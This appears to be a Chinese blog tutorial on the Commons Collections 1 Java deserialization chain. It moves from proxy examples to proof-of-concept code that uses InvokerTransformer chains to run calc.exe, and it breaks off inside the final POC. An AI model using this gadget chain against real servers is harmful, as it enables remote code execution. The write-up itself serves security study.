    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CommonCollections利用链是Java反序列化中最经典的利用链</p><p>本文将对Common-Collections-1的反序列化利用进行分析</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文将从以下方面进行讲述</p><ul><li>动态代理</li><li>CommonCollections-1 POC构造</li></ul><h1 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons Collections"></a>Commons Collections</h1><p>Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。</p><p>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p><p>由于大量的生产环境中都会导入这个包，所以此包中的众多反序列化链已经成为经典链条。</p><h1 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h1><p>代理模式是常用的java设计模式，他的特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法，来提供特定的服务。简单的说就是，我们在访问实际对象时，是通过代理对象来访问的，代理模式就是在访问实际对象时引入一定程度的间接性。<br><img src="/img/markdown-img-paste-20211111161147882.png"></p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>在编译时就已经将接口，被代理类，代理类等确定下来。在程序运行之前，代理类的.class文件就已经生成。</p><h3 id="静态代理的简单demo"><a href="#静态代理的简单demo" class="headerlink" title="静态代理的简单demo"></a>静态代理的简单demo</h3><p>People.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">People</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">paytaxes</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Staff.class</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Staff</span> <span class="hljs-title">implements</span> <span class="hljs-title">People</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-title">Staff</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">paytaxes</span>(<span class="hljs-params"></span>)</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;交税1.2w&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Company.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Company</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">People</span></span>&#123;<br><br>    Staff sta;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Company</span><span class="hljs-params">(People sta)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(sta.getClass() == Staff.class) &#123;<br>            <span class="hljs-keyword">this</span>.sta = (Staff)sta;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">paytaxes</span><span class="hljs-params">()</span> </span>&#123;<br>        sta.paytaxes();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试一下代理模式<br>Test.class</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) &#123;<br><br>        People zhangsan = <span class="hljs-keyword">new</span> <span class="hljs-type">Staff</span>(<span class="hljs-string">&quot;errorecho&quot;</span>);<br><br>        People proxy = <span class="hljs-keyword">new</span> <span class="hljs-type">Company</span>(zhangsan);<br><br>        proxy.paytaxes();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/markdown-img-paste-20211111162829241.png"><br>这里并没有直接调用被代理对象的方法，而是通过代理对象去代理执行。此为代理模式<br>代理模式最主要的就是有一个公共接口（People），一个具体的类（Staff），一个代理类（Company）,代理类持有具体类的实例，代为执行具体类实例方法。<br>代理模式就是在访问实际对象时引入一定程度的间接性，因为这种间接性，可以附加多种用途。<br>例如这里我们想在所有staff交税前为它缴纳补充医保，只需修改Company.class。即可为所有员工缴纳<br>Staff.class</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Company</span> <span class="hljs-title">implements</span> <span class="hljs-title">People</span>&#123;<br><br>    Staff sta;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Company</span>(<span class="hljs-params">People sta</span>)</span> &#123;<br>        <span class="hljs-keyword">if</span>(sta.getClass() == Staff.<span class="hljs-keyword">class</span>) &#123;<br>            <span class="hljs-keyword">this</span>.sta = (Staff)sta;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">paytaxes</span>(<span class="hljs-params"></span>)</span> &#123;<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;缴纳补充医保&quot;</span>);<br>        sta.paytaxes();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/markdown-img-paste-20211111163743357.png"></p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>代理类在程序运行时创建的代理方式被成为动态代理。 我们上面静态代理的例子中，代理类(Company)是自己定义好的，在程序运行之前就已经编译完成。然而动态代理，代理类并不是在Java代码中定义的，而是在运行时根据我们在Java代码中的“指示”动态生成的。相比于静态代理， 动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。</p><h3 id="动态代理的简单实现"><a href="#动态代理的简单实现" class="headerlink" title="动态代理的简单实现"></a>动态代理的简单实现</h3><p>People.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">People</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">paytaxes</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Staff.class</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Staff</span> <span class="hljs-title">implements</span> <span class="hljs-title">People</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-title">Staff</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">paytaxes</span>(<span class="hljs-params"></span>)</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;交税1.2w&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ProxyHandler.class</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.<span class="hljs-keyword">Method</span>;<br><br><span class="hljs-keyword">class</span> ProxyHandler implements InvocationHandler &#123;<br>    //这里写的是<span class="hljs-keyword">Object</span>类<br>    private <span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span>;<br><br>    <span class="hljs-built_in">public</span> ProxyHandler(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span>) &#123;<br>        this.<span class="hljs-keyword">object</span> = <span class="hljs-keyword">object</span>;<br>    &#125;<br><br>    @Override<br>    <span class="hljs-built_in">public</span> <span class="hljs-keyword">Object</span> invoke(<span class="hljs-keyword">Object</span> proxy, <span class="hljs-keyword">Method</span> <span class="hljs-keyword">method</span>, <span class="hljs-keyword">Object</span>[] args) throws Throwable &#123;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;--------------begin-------------&quot;);<br>        //通过反射来调用被代理类的方法<br>        <span class="hljs-keyword">method</span>.invoke(<span class="hljs-keyword">object</span>, args);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;--------------end-------------&quot;);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>测试动态代理<br>ProxyTest.class</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import java.lang.reflect.InvocationHandler;<br>import java.lang.reflect.Proxy;<br><br>public <span class="hljs-keyword">class</span> ProxyTest &#123;<br><br>    public static void main(String<span class="hljs-literal">[]</span> args) &#123;<br>        <span class="hljs-comment">//实例化被动态代理的对象</span><br>        Staff staff = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Staff(<span class="hljs-string">&quot;xiaoming&quot;</span>)</span>;<br>        <span class="hljs-comment">//实例化实现了InvocationHandler接口的类</span><br>        InvocationHandler proxyHandler = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ProxyHandler(<span class="hljs-params">staff</span>)</span>;<br>        <span class="hljs-comment">//创建代理类proxyStaff</span><br>        People proxyStaff = (People) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(Staff.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Staff</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Interfaces()</span>, proxyHandler);<br>        <span class="hljs-comment">//代理类对象调用被代理类的方法</span><br>        proxyStaff.paytaxes<span class="hljs-literal">()</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/markdown-img-paste-20211111172352881.png"></p><h1 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h1><p>在commons collections中有一个Transformer接口，其中包含一个transform方法，通过实现此接口来达到类型转换的目的。</p><p><img src="/img/markdown-img-paste-20211115152147623.png"></p><p>该接口的重要实现类有：ConstantTransformer、InvokerTransformer、ChainedTransformer、TransformedMap 。</p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>ConstantTransformer实现了Transformer接口，并重写了transform方法</p><p><img src="/img/markdown-img-paste-20211115152337212.png"></p><p>在源码中，不难看出，重写的方法实现的功能：对输入的对象原封不动的返回</p><p>举例：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> POC &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;<br>        <span class="hljs-keyword">Object</span> obj = Runtime.<span class="hljs-keyword">class</span>;<br>        ConstantTransformer transformer = <span class="hljs-built_in">new</span> ConstantTransformer(obj);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(transformer.<span class="hljs-keyword">transform</span>(obj));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序结果</p><p><img src="/img/markdown-img-paste-20211115152734206.png"></p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer类transform方法实现了类方法动态调用，即采用反射机制动态调用类方法（反射方法名、参数值均可控）并返回该方法执行结果。</p><p><img src="/img/markdown-img-paste-20211115153244845.png"></p><p>举例，利用InvokerTransformer实现代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-keyword">String</span>[] args) throws <span class="hljs-built_in">Exception</span> &#123;<br>        <span class="hljs-comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span><br>        InvokerTransformer a = <span class="hljs-keyword">new</span> InvokerTransformer(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">Class</span>[]</span>&#123;<span class="hljs-keyword">String</span>.<span class="hljs-keyword">class</span>&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>        );<br>        <span class="hljs-comment">//构造input</span><br>        <span class="hljs-keyword">Object</span> input=<span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>));<br>        <span class="hljs-comment">//执行</span><br>        a.transform(input);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据传入的参数，成功执行calc.exe<br><img src="/img/markdown-img-paste-20211115153818943.png"></p><p>根据前文，我们得知ConstantTransformer可以原封不动的返回对象，则我们可以组合一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-keyword">String</span>[] args) throws <span class="hljs-built_in">Exception</span> &#123;<br>        <span class="hljs-comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span><br>        InvokerTransformer a = <span class="hljs-keyword">new</span> InvokerTransformer(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">Class</span>[]</span>&#123;<span class="hljs-keyword">String</span>.<span class="hljs-keyword">class</span>&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>        );<br>        <span class="hljs-comment">//构造input</span><br>        <span class="hljs-keyword">Object</span> constantTransformer = <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>))).transform(<span class="hljs-number">123</span>);<br>        <span class="hljs-comment">//执行</span><br>        a.transform(constantTransformer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果同上</p><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer类封装了Transformer的链式调用，我们只需要传入一个Transformer数组，ChainedTransformer就会依次调用每一个Transformer的transform方法。</p><p><img src="/img/markdown-img-paste-2021111515475802.png"></p><p>同时，第一个transform调用的结果会作为第二个transform调用的输出</p><p>那么，我们就可以构造如下POC</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>))),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<br>                                <span class="hljs-keyword">String</span>.class<br>                        &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<br>                                <span class="hljs-string">&quot;calc.exe&quot;</span><br>                        &#125;<br>                )<br>        &#125;);<br>        chainedTransformer.transform(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是，这只是在本地测试可行，如果配上反序列化的话，就会出现以下错误</p><p><img src="/img/markdown-img-paste-20211115161718414.png"></p><p>原因在于Runtime实例并未继承Serialeze，因此无法反序列化</p><p>所以我们需要在服务端生成一个Runtime实例</p><p>稍作修改</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<br>                                <span class="hljs-keyword">String</span>.class<br>                        &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<br>                                <span class="hljs-string">&quot;calc.exe&quot;</span><br>                        &#125;<br>                )<br>        &#125;);<br>        chainedTransformer.transform(<span class="hljs-number">1</span>);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(f);<br>        fout.writeObject(chainedTransformer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们发现依旧出错，通过试调，发现原因在于</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span><span class="hljs-keyword">class</span><br><span class="hljs-keyword">try</span> &#123;<br>    Class cls = input.get<span class="hljs-constructor">Class()</span>;<br>    Method <span class="hljs-keyword">method</span> = cls.get<span class="hljs-constructor">Method(<span class="hljs-params">this</span>.<span class="hljs-params">iMethodName</span>, <span class="hljs-params">this</span>.<span class="hljs-params">iParamTypes</span>)</span>;<br>    return <span class="hljs-keyword">method</span>.invoke(input, this.iArgs);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里存在input.getClass()</p><p>做个实验</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> Test2 &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> argv)&#123;<br>        Object a = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>;<br>        Class b = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span><span class="hljs-keyword">class</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(a.get<span class="hljs-constructor">Class()</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(b.get<span class="hljs-constructor">Class()</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/markdown-img-paste-20211115162858204.png"></p><p>我们可以得出如下结论</p><ul><li>当input是一个类的实例对象时，获取到的是这个类</li><li>当input是一个类时，获取到的是java.lang.Class</li></ul><p>所以当我们传入的是一个Runtime.class类的话，它获取的就是java.lang.Class</p><p>此时，我们就得到一个悖论</p><ul><li>如果我们传入一个Runtime实例，则不能反序列化</li><li>如果我们传入一个Runtime类，则获取不到Runtime类</li></ul><p>因此不能直接通过Runtime.getRuntime()获得Runtime实例</p><p>在之前构造的POC中，我们等价于先去用getRuntime()方法取出一个Runtime实例对象。</p><p>现在我们换一种思路，通过反射机制</p><ul><li>取出getMethod方法，通过反射取出getRuntime</li><li>取出invoke方法，通过反射invoke方法执行getRuntime，获取实例对象</li></ul><p>因此POC如下</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer 